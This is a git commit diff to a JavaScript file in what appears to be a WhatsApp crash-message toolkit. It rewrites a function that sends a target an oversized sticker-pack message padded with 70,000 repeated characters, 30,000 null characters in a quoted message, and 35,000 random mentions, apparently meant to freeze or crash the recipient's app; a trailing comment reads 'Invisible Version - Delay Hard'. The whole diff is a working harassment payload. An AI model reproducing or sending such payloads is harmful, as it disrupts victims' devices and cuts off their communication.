070b10fad1bbae02854fa4137d68856fa8eca3c3
brmenn <137709370+brmenn@users.noreply.github.com>
2025-06-12 10:58:25 +0700

    Update L.js

--- function/NullXTeam/L.js
+++ function/NullXTeam/L.js
@@ -413,107 +413,68 @@ async function H3(sock, targetNumber) {
 }
 
 async function F(sock, target) {
-    await sock.relayMessage(target, {
-        stickerPackMessage: {
-            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
-            name: "Xrelly - StickerPack" + "ꦾ".repeat(70000),
-            publisher: "Xrelly Mp4" + "",
-            stickers: [
-                {
-                    fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "Jawa Jawa",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                },
-                {
-                    fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
-                    isAnimated: false,
-                    emojis: [""],
-                    accessibilityLabel: "",
-                    isLottie: false,
-                    mimetype: "image/webp"
-                }
-            ],
-            fileLength: "3662919",
-            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
-            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
-            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
-            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
-            contextInfo: {
-                remoteJid: "X",
-                participant: "0@s.whatsapp.net",
-                stanzaId: "1234567890ABCDEF",
-                mentionedJid: [
-                    "6285215587498@s.whatsapp.net",
-                    ...Array.from({ length: 25000 }, () =>
-                        `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
-                    )
-                ]
+await sock.relayMessage(
+  target,
+  {
+    stickerPackMessage: {
+      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+      name: "ꦾ".repeat(70000),
+      publisher: "",
+      stickers: [],
+      fileLength: "3662919",
+      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+      directPath: "/v/t62.15575-24/…",
+      mediaKeyTimestamp: "1747502082",
+      trayIconFileName: "icon.webp",
+      thumbnailDirectPath: "/v/t62.15575-24/…",
+      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+      thumbnailHeight: 252,
+      thumbnailWidth: 252,
+      imageDataHash: "...",
+      stickerPackSize: "3680054",
+      stickerPackOrigin: "USER_CREATED",
+      containsAutoReply: true,
+      backgroundArgb: 0xFF1DA1F2,
+      thumbnailImageWidth: 512,
+      thumbnailImageHeight: 512,
+      ephemeralExpiration: 86400, // 1 day
+      disappearingModeInitiator: "6281234567890@s.whatsapp.net",
+      contextInfo: {
+        quotedMessage: {
+          conversation: "\u0000".repeat(30000)
+        },
+        remoteJid: "status@broadcast",
+        participant: "6281234567890@s.whatsapp.net",
+        stanzaId: "ABCDEF123456",
+        isForwarded: true,
+        forwardingScore: 999,
+        mentionedJid: [
+          "13135550202@s.whatsapp.net",
+          "0@s.whatsapp.net",
+          ...Array.from(
+            {
+              length: 1000 * 35,
             },
-            packDescription: "",
-            mediaKeyTimestamp: "1747502082",
-            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
-            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
-            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
-            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
-            thumbnailHeight: 252,
-            thumbnailWidth: 252,
-            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
-            stickerPackSize: "3680054",
-            stickerPackOrigin: "USER_CREATED"
+            () =>
+              "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net"
+          ),
+        ],
+        externalAdReply: {
+          title: "-",
+          body: "-",
+          thumbnailUrl: "https://i.imgur.com/UWbD4Tg.jpeg",
+          mediaType: 1,
+          renderLargerThumbnail: true,
+          sourceUrl: "https://google.com"
         }
-    }, {});
-}
+      }
+    }
+  },
+  { messageId: null }
+)}
 
 // HIS FUNCTION
 // Invisible Version - Delay Hard
